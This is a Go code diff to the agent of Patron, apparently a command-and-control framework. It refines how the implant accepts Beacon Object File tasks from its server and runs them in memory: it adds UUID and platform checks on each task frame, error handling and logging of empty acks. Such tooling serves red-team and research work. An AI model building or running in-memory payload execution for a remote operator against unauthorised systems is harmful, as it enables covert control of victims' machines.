@@ -9,9 +9,9 @@ import (
 	"time"
 
 	patronobuf "github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
-	"github.com/golang/protobuf/proto"
 	"github.com/PatronC2/Patron/lib/common"
 	"github.com/PatronC2/Patron/lib/logger"
+	"google.golang.org/protobuf/proto"
 )
 
 // bofExchangeTimeout is a safety net for the BOF poll/response exchange.
@@ -48,14 +48,25 @@ func HandleBOFExecuteRequest(beacon io.ReadWriteCloser, agentID string) error {
 		// we receive and keep reading until the ack arrives so the stream
 		// stays in sync.
 		reqMsg := &patronobuf.Request{}
-		if proto.Unmarshal(data, reqMsg) == nil && reqMsg.GetBofExecute() != nil {
-			resp := ExecuteBOFInMemory(reqMsg.GetBofExecute().GetPayload(), reqMsg.GetBofExecute().GetFunctionName())
-			if resp.GetSuccess() {
-				logger.Logf(logger.Info, "Executed BOF %q: %s", resp.GetFunctionName(), resp.GetOutput())
-			} else {
-				logger.Logf(logger.Error, "BOF %q failed: %s", resp.GetFunctionName(), resp.GetOutput())
+		if proto.Unmarshal(data, reqMsg) == nil {
+			be := reqMsg.GetBofExecute()
+			// Request and Response share the same wire layout (type=1, payload
+			// oneof at field 9), so the server's "no tasks" ack also unmarshals
+			// here as an empty BoFExecuteRequest. Only treat a frame as a real
+			// task when it is stamped with this agent's UUID and a valid platform.
+			if be != nil && be.GetUuid() == agentID &&
+				(be.GetPlatform() == "linux" || be.GetPlatform() == "windows") {
+				resp, err := ExecuteBOFInMemory(be.GetPayload(), be.GetFunctionName()) // Windows: resp := ExecuteBOFInMemory(...)
+				if err != nil {
+					return fmt.Errorf("failed to execute BOF %q: %w", be.GetFunctionName(), err)
+				}
+				if resp.GetSuccess() {
+					logger.Logf(logger.Info, "Executed BOF %q: %s", resp.GetFunctionName(), resp.GetOutput())
+				} else {
+					logger.Logf(logger.Error, "BOF %q failed: %s", resp.GetFunctionName(), resp.GetOutput())
+				}
+				continue
 			}
-			continue
 		}
 
 		respMsg := &patronobuf.Response{}
@@ -66,8 +77,9 @@ func HandleBOFExecuteRequest(beacon io.ReadWriteCloser, agentID string) error {
 		break
 	}
 
-	if bofResp == nil {
-		logger.Logf(logger.Warning, "BOF: unexpected response type from server")
+	if bofResp == nil || bofResp.GetUuid() == "" {
+		// The server's "no pending tasks" ack is an empty BoFExecuteResponse.
+		logger.Logf(logger.Info, "No pending BOF tasks for agent %s", agentID)
 		return nil
 	}
 
